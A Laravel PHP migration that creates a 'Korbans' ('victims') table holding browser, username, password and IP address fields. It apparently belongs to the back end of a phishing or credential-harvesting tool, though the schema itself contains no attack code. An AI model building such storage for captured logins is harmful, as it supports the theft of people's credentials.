<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('Korbans', function (Blueprint $table) {
            $table->id();
            $table->string('Browserd',255);
            $table->string('Usernamed',500)->nullable();
            $table->string('Passwodd',255)->nullable();
            $table->string('ipAddrs',255)->nullable();
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('Korbans');
    }
};
